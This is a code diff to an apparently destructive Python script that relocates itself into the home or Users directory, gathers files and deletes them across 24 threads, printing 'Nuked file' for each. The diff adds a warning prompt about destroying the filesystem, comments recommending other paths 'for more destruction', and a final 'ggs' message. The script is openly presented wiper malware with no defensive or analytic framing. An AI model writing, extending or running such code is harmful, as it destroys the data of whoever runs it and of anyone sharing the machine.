@@ -1,3 +1,4 @@
+input('Proceeding from here is DANGEROUS. Press ctrl + c if u dont want to destroy ur entire filesystem') # remove this line to get rid of the warning
 import os
 import subprocess
 import shutil
@@ -7,12 +8,12 @@ flist = []
 try:
     if os.name == 'posix':
         source = os.path.expanduser("~/bad/worse.py")
-        destination = "/home/worse.py"
+        destination = "/home/worse.py" #change to /worse.py for more destruction 
    
 
     elif os.name == 'nt':
         source = os.path.expanduser(r"~\bad\worse.py")
-        destination = r"C:\Users"
+        destination = r"C:\Users" #change to C:\worse.py for more destruction (idk if it works but who cares)
 
     shutil.move(source, destination)
     subprocess.run(
@@ -41,7 +42,8 @@ def nuke(i):
             print("Nuked file: ", i)
     except Exception as e:
         print("Error: ", e)
-        
+
+
 with ThreadPoolExecutor(max_workers=24) as executor:
     executor.map(nuke, flist)
-print('Directory Nuked')
+print('ggs')
